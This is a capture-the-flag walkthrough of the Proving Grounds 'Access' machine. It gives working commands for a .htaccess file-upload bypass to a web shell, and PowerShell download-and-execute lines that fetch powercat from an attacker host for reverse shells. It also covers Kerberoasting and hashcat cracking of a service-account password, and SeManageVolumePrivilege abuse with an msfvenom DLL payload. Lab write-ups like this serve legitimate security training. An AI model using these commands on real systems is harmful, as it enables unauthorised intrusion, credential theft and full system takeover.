# PG Access 
## File Upload, Hypertext access (.htaccess), Kerberoasting, SeChangeNotifyPrivilege
## Scan
```
nmap -Pn -T4 -p- --min-rate=1000 -sV -sC $IP
```
## Directory Bruteforce
```
gobuster -u http://$IP dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b "403,404" -t 50 -e -x "html,php,txt,jsp"
```
## File Upload
```
The website allows users to upload an image file when buying tickets.
The "/uploads" directory seems to be where users upload images to, create a test.jpg and upload.
After clicking "purchase", there is a pop-up window to show us the purchase has been made. And now, the "sample.jpg" is also shown in the "/uploads" 
File Upload -> Foothold
The ".php" extension seems blocklisted on the server. I was able to upload files with my own extension such as ".xxx".
I then uploaded a web shell as "webshell.xxx" to the server and the server accepted it.
```
## .htaccess files
```
The server running on the machine is apache. So we could potentially upload a ".htaccess" file to the directory to let the server render my ".xxx" extension as PHP script.
Make a ".htaccess" file and upload it to the server:
echo "AddType application/x-httpd-php .xxx" > .htaccess
The ".htaccess" file is not shown in the "/uploads" directory because it is a hidden file.
After uploading, I can see the web shell.
The server now renders the ".xxx" extension as PHP, which allows me to perform command execution.
```
## Foothold
```
Webshell
I was hosting a "powercat.ps1" script on my kali port 80.
Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.x.x/powercat.ps1');powercat -c 192.168.x.x -p 4444 -e cmd
Execute the command through the web shell to download the "powercat.ps1" with PowerShell and run the reverse shell command.
Now I have a shell as "svc_apache"
```
## Lateral Movement (svc_apache -> svc_mssql)
```
I need to switch to "svc_mssql" laterally to get the flag.
SVC usually implies a service account which can request tickets. First, I need to get a list of service principal names of the machine.
```
## Get SPNs (Service Principal Names)
```
Get-SPN.ps1
Host it on your kali then download the script from the machine in the same way when we downloaded "powercat.ps1".
Powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.x.x/Get-SPN.ps1','C:\Users\svc_apache\Desktop\Get-SPN.ps1')
Run Get-SPN.ps1, the SPN of the "MSSQL" object was collected, "MSSQLSvc/DC.access.offsec".
The next step is to request the ticket from "svc_mssql" and get the hash from the ticket.
```
## Request the Ticket
```
To request the ticket, two commands can be executed to request and store the ticket in memory:
PS> Add-Type -AssemblyName System.IdentityModel
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec'
```
## Kerberoast Hash (Invoke-Kerberoast.ps1)
```
To get the kerberoasted hash of the ticket, "Invoke-Kerberoast.ps1" is needed to extract the hash from memory.
It can be downloaded through the command:
wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
I hosted the script on kali and ran the script remotely on the target machine
Run the script through the command:
PS> iex(new-object net.webclient).downloadString('http://192.168.x.x:80/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat
Save the extracted hash to kali locally and crack with Hashcat.
```
## Crack Hash
```
Crack the "krb5tgs" hash through the command:
hashcat -m 13100 --force -a 0 svc_mssql.kerberoast /usr/share/wordlists/rockyou.txt
You can verify your cracked credentials with NetExec:
NetExec smb $IP -u 'svc_mssql' -p 'trustno1'
The password was accepted, but couldn't be used to log in through "WINRM", which meant I might need to log in to "svc_mssql" within the machine.
To get access to "svc_mssql" within the machine, I need to run commands as "svc_mssql" to get a reverse shell.
The "Invoke-RunasCs.ps1" script could be used in this case.
```
## Invoke-RunasCs.ps1
```
wget https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1
Downloaded the script to the machine:
Powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.x.x/Invoke-RunasCs.ps1','C:\Users\svc_apache\Desktop\Invoke-RunasCs.ps1')
After transferring the script, Verify the running of the command as "svc_mssql", and it worked:
PS> import-module ./Invoke-RunasCs.ps1
PS> Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
```
## Reverse Shell
```
To get the reverse shell as "svc_mssql", I ran the command to download and run the reverse shell with "powercat.ps1" again. 
PS> Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.49.211/powercat.ps1');powercat -c 192.168.49.211 -p 5555 -e cmd"
Now we have access on "svc_mssql".
```
## PrivEsc (svc_mssql -> administrator)
```
The "SeManageVolumePrivilege" privilege was set to enabled on the "svc_mssql" user.
I found a SeManageVolumeAbuse GitHub repo that can be used to abuse this priv.
The attacker can leverage this exploitation to get full control over "C:\",then it can craft a ".dll" file and place it in somewhere "C:\Windows\System32\" to trigger the payload as root.
```
## SeManageVolumePrivilege Abuse
```
https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public
Download the binary executable and transfer it to the machine. 
After running the exploit, I could see I was able to write to the "C:\Windows\System32\" folder via icacls C:\Windows
Make a reverse shell payload with msfvenom
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=6666 -f dll -o tzres.dll
Transfer the DLL payload to "C:\Windows\System32\wbem\".
In the last step, I ran systeminfo to trigger the payload for a root shell hitting my listener.
```













